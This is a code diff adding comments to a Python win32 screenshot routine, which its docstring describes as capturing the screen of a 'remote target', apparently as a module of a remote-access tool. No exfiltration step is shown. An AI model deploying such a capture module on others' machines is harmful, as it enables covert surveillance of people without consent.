@@ -1,5 +1,10 @@
-import base64
-import win32api
+'''
+A script that will take a screenshot on the remote target.
+I don't know a lot about these, so inform me if you saw something wrong.
+'''
+# Import needed packages
+import base64  # Encoder
+import win32api  # Windows APIs
 import win32con
 import win32gui
 import win32ui
@@ -11,6 +16,7 @@ def get_dimensions():
     top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
     return (width, height, left, top)
 
+# Take screenshot
 def screenshot(name='screenshot'):
     hdesktop = win32gui.GetDesktopWindow()
     width, height, left, top = get_dimensions()
@@ -28,6 +34,7 @@ def screenshot(name='screenshot'):
     mem_dc.DeleteDC()
     win32gui.DeleteObject(screenshot.GetHandle())
 
+# Run the program
 def run():
     screenshot()
     with open('screenshot.bmp') as f:
